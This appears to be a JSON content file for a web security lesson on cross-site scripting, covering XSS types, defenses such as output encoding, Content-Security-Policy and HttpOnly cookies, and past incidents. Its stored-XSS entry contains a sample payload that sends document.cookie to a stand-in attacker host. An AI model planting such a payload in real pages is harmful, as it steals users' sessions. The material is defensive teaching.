{
  "intro": {
    "title": "XSS (Cross-Site Scripting) - Protect Your Users"
  },
  "whatIsXss": {
    "title": "What is Cross-Site Scripting (XSS)?",
    "text": "Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts (usually JavaScript) into web pages viewed by other users. When victims load the infected page, the malicious script executes in their browser, allowing the attacker to steal data, hijack sessions, or perform actions on behalf of the victim."
  },
  "whyIsItDangerous": {
    "title": "Why is XSS dangerous?",
    "risks": [
      "Stealing session cookies and tokens (session hijacking)",
      "Stealing sensitive data entered by users (passwords, credit cards)",
      "Redirecting users to phishing or malware sites",
      "Modifying page content seen by the victim",
      "Performing actions on behalf of the victim (e.g., money transfers)",
      "Installing keyloggers to capture all user input",
      "Spreading worms that infect other users"
    ]
  },
  "typesOfXss": {
    "title": "Types of XSS Attacks",
    "types": {
      "reflectedXss": {
        "name": "Reflected XSS (Non-Persistent)",
        "description": "The malicious script is part of the request (e.g., URL parameter) and is immediately reflected back in the response. The attack is not stored on the server.",
        "example": "URL: https://example.com/search?q=<script>alert('XSS')</script>",
        "howItWorks": "Attacker sends victim a malicious link. When clicked, the script executes in victim's browser.",
        "realWorldScenario": "Phishing emails with malicious links, social media posts with crafted URLs"
      },
      "storedXss": {
        "name": "Stored XSS (Persistent)",
        "description": "The malicious script is permanently stored on the server (database, files, logs) and executed every time users view the infected content.",
        "example": "Comment field: <script>document.location='http://attacker.com?cookie='+document.cookie</script>",
        "howItWorks": "Attacker posts malicious content (comment, profile, message). Every user viewing it gets infected.",
        "realWorldScenario": "Forum posts, user profiles, blog comments, chat messages"
      },
      "domBasedXss": {
        "name": "DOM-Based XSS",
        "description": "The vulnerability exists in client-side JavaScript code that improperly handles user input. The malicious payload never reaches the server - it's processed entirely in the browser's DOM.",
        "example": "JavaScript: document.getElementById('output').innerHTML = location.hash;",
        "howItWorks": "JavaScript reads data from URL/DOM and inserts it into the page without sanitization.",
        "realWorldScenario": "Single Page Applications (SPAs), client-side routing, dynamic content rendering"
      }
    }
  },
  "occurrenceConditions": {
    "title": "Where XSS vulnerabilities occur",
    "places": [
      "Search fields that display the search term",
      "Comment sections, forums, and chat applications",
      "User profiles (name, bio, location)",
      "Form fields that echo user input",
      "URL parameters displayed on the page",
      "Error messages containing user input",
      "Any place where user input is rendered in HTML without sanitization"
    ]
  },
  "typicalCodingMistakes": {
    "title": "Typical coding mistakes leading to XSS",
    "mistakes": [
      "Directly inserting user input into HTML without encoding (innerHTML, document.write)",
      "Not validating or sanitizing user input on server-side",
      "Using dangerous JavaScript functions (eval, setTimeout with string)",
      "Trusting client-side validation only",
      "Not setting proper Content-Security-Policy headers",
      "Improper use of template engines without auto-escaping",
      "Reflecting URL parameters directly in HTML"
    ]
  },
  "howToProtect": {
    "title": "How to protect against XSS",
    "description": "Below are best practices to prevent XSS attacks:",
    "methods": {
      "outputEncoding": {
        "title": "Output encoding/escaping",
        "description": "Always encode user data before inserting it into HTML, JavaScript, CSS, or URLs. This converts dangerous characters into safe representations.",
        "encodingTypes": {
          "htmlContext": {
            "title": "HTML Context",
            "description": "Encode: < > \" ' & into &lt; &gt; &quot; &#x27; &amp;",
            "example": "User input: <script>alert('XSS')</script> → Displayed as: &lt;script&gt;alert('XSS')&lt;/script&gt;"
          },
          "javascriptContext": {
            "title": "JavaScript Context",
            "description": "Use JSON.stringify() for data in JavaScript, escape quotes and backslashes",
            "example": "var userName = JSON.stringify(userInput); // Safe"
          },
          "urlContext": {
            "title": "URL Context",
            "description": "Use encodeURIComponent() for URL parameters",
            "example": "var url = '/search?q=' + encodeURIComponent(userInput);"
          },
          "cssContext": {
            "title": "CSS Context",
            "description": "Avoid user input in CSS. If necessary, use strict validation and hex encoding",
            "example": "Never allow user input in style attributes or CSS files"
          }
        }
      },
      "contentSecurityPolicy": {
        "title": "Content Security Policy (CSP)",
        "description": "CSP is an HTTP header that tells the browser which sources of content are trusted. It can block inline scripts and restrict where scripts can be loaded from.",
        "recommendations": [
          "Set CSP header: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com",
          "Disable inline scripts ('unsafe-inline') when possible",
          "Use nonces or hashes for legitimate inline scripts",
          "Report violations with report-uri directive"
        ],
        "example": "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; object-src 'none'"
      },
      "inputValidation": {
        "title": "Input validation (defense-in-depth)",
        "description": "Validate and sanitize all user input. Use allowlists for expected formats and reject unexpected data.",
        "recommendations": [
          "Validate data type and format (email, number, URL)",
          "Use allowlists for known-good values",
          "Reject input containing script tags or javascript: protocol",
          "Limit input length to reasonable values",
          "Validate on both client and server side (never trust client only)"
        ]
      },
      "useFrameworksCorrectly": {
        "title": "Use modern frameworks with auto-escaping",
        "description": "Modern frameworks (React, Vue, Angular) automatically escape output by default. However, they can be bypassed if used incorrectly.",
        "recommendations": [
          "React: Avoid dangerouslySetInnerHTML - use only with sanitized HTML",
          "Vue: Avoid v-html with user input",
          "Angular: Avoid bypassSecurityTrust methods with user input",
          "Always use framework's safe methods for rendering user content"
        ]
      },
      "httpOnlyCookies": {
        "title": "HTTPOnly and Secure cookie flags",
        "description": "Protect session cookies from being stolen by XSS attacks.",
        "recommendations": [
          "Set HTTPOnly flag on session cookies (prevents JavaScript access)",
          "Set Secure flag (cookies only sent over HTTPS)",
          "Set SameSite attribute to prevent CSRF",
          "Example: Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict"
        ]
      },
      "sanitizeHtml": {
        "title": "HTML sanitization for rich content",
        "description": "If you must allow users to input HTML (rich text editors), use a trusted sanitization library to remove dangerous elements and attributes.",
        "recommendations": [
          "Use libraries like DOMPurify, Bleach, or OWASP Java HTML Sanitizer",
          "Never write your own HTML sanitizer (it's extremely complex)",
          "Configure sanitizer to allow only safe tags (p, b, i, a, img) and attributes",
          "Remove all event handlers (onclick, onerror, onload)",
          "Sanitize on server-side before storing in database"
        ]
      },
      "avoidDangerousFunctions": {
        "title": "Avoid dangerous JavaScript patterns",
        "description": "Certain JavaScript functions and patterns can execute arbitrary code and should be avoided or used with extreme caution.",
        "recommendations": [
          "Never use eval() with user input",
          "Avoid setTimeout/setInterval with string arguments",
          "Don't use document.write() with user data",
          "Be careful with innerHTML, outerHTML - prefer textContent or framework methods",
          "Avoid new Function() with user input"
        ]
      },
      "xssAuditing": {
        "title": "Enable browser XSS protection",
        "description": "Modern browsers have built-in XSS filters. Enable them with HTTP headers (though CSP is more powerful).",
        "recommendations": [
          "X-XSS-Protection: 1; mode=block (legacy, but still useful)",
          "Prefer Content-Security-Policy over X-XSS-Protection",
          "Note: Chrome removed XSS Auditor, so CSP is essential"
        ]
      }
    }
  },
  "detectionAndMonitoring": {
    "title": "Detection and Monitoring",
    "description": "How to detect XSS attacks?",
    "points": [
      "Monitor Content-Security-Policy violation reports",
      "Log and analyze suspicious patterns in user input (script tags, event handlers)",
      "Use Web Application Firewalls (WAF) to detect common XSS patterns",
      "Implement anomaly detection for unusual JavaScript execution",
      "Regular security scanning with tools (OWASP ZAP, Burp Suite)",
      "Monitor for unexpected changes in stored content (comments, profiles)",
      "Track unusual cookie access patterns"
    ]
  },
  "secureCodePolicyExamples": {
    "title": "Secure Code Policy Examples",
    "description": "Rules for preventing XSS in development",
    "points": [
      "All user input must be encoded/escaped before display",
      "Never use dangerouslySetInnerHTML, v-html, or bypassSecurityTrust without sanitization",
      "Implement Content-Security-Policy on all pages",
      "Set HTTPOnly and Secure flags on all authentication cookies",
      "Use automated security testing in CI/CD pipeline",
      "Code review must check for XSS vulnerabilities",
      "Use static analysis tools (ESLint security plugins, SonarQube)"
    ]
  },
  "commonMyths": {
    "title": "Common Myths",
    "description": "Misconceptions about XSS",
    "points": [
      "\"Client-side validation is enough\" - Attackers bypass client-side checks easily; always validate server-side",
      "\"My framework handles everything\" - Frameworks help but can be bypassed with dangerous methods",
      "\"Only <script> tags are dangerous\" - Event handlers (onerror, onload), javascript: URLs, and other vectors exist",
      "\"HTMLencode() solves everything\" - Context matters; encoding for HTML doesn't work in JavaScript or URL contexts",
      "\"WAF provides complete protection\" - WAF is a layer, not a replacement for secure coding"
    ]
  },
  "realWorldExamples": {
    "title": "Real-World XSS Attacks",
    "description": "Famous XSS incidents:",
    "examples": [
      {
        "name": "Samy Worm (MySpace, 2005)",
        "year": 2005,
        "type": "Stored XSS (self-propagating)",
        "description": "The Samy Worm exploited a stored XSS vulnerability in MySpace user profiles by injecting malicious JavaScript into the 'About Me' section. When a user viewed an infected profile, the script executed automatically, adding Samy as a friend and copying itself to that user's profile. This self-replicating behavior caused an exponential infection rate, with over a million profiles compromised in less than 24 hours. The attack demonstrated the dangers of unsanitized user-generated content and the potential for social-network worms to spread rapidly, leading to MySpace temporarily shutting down to fix the vulnerability and banning the attacker."
      },
      {
        "name": "Twitter XSS (2010)",
        "year": 2010,
        "type": "Reflected / DOM XSS (via tweet content and event handlers)",
        "description": "A security flaw in Twitter allowed malicious JavaScript embedded in tweets to execute when users interacted with them. The attack leveraged DOM-based injection and event handlers such as 'onmouseover', enabling automatic retweets, redirects to external websites, and the potential theft of session tokens. The attack spread quickly due to the real-time nature of the Twitter feed and the platform's automatic retweet functionality, affecting thousands of accounts, including verified users. It highlighted the risks of improperly sanitized dynamic content and the amplification potential in high-traffic social media platforms."
      },
      {
        "name": "British Airways Payment-page Compromise (Magecart, 2018)",
        "year": 2018,
        "type": "Third-party / supply-chain JavaScript injection (Magecart-style)",
        "description": "Attackers injected malicious JavaScript into British Airways' payment page to intercept sensitive customer data, including credit card numbers, names, and billing addresses. The script captured payment information as it was entered and sent it to attacker-controlled servers, bypassing traditional security monitoring because it ran in the context of a trusted domain. Approximately 380,000 customer records were compromised, leading to a £20 million regulatory fine. The attack illustrated how third-party scripts and supply-chain vulnerabilities can be exploited for large-scale data theft, emphasizing the importance of content security policies, subresource integrity, and strict third-party code audits."
      },
      {
        "name": "eBay Persistent XSS (2015-2016)",
        "year": 2015,
        "type": "Stored (persistent) XSS in product listings",
        "description": "A persistent XSS vulnerability existed in eBay's product listing fields, allowing attackers to embed JavaScript into item titles or descriptions. When other users viewed these listings, the malicious code executed in their browsers, potentially stealing session cookies, hijacking accounts, or redirecting users to phishing sites. The flaw persisted for months, exposing thousands of buyers and sellers to fraud. This incident demonstrated the long-term risks of unpatched stored XSS in e-commerce platforms and the need for both rapid security response and robust input/output sanitization strategies to protect users and maintain platform trust."
      }
    ]
  },
  "summary": {
    "title": "Summary",
    "description": "Key takeaways:",
    "points": [
      "XSS allows attackers to execute malicious JavaScript in victim's browser",
      "Three main types: Reflected, Stored, and DOM-Based XSS",
      "Always encode/escape user output based on context (HTML, JavaScript, URL, CSS)",
      "Use Content-Security-Policy to restrict script sources",
      "Set HTTPOnly and Secure flags on cookies",
      "Use framework auto-escaping, avoid dangerous methods",
      "Defense in depth: validation + encoding + CSP + HTTPOnly cookies + monitoring"
    ]
  }
}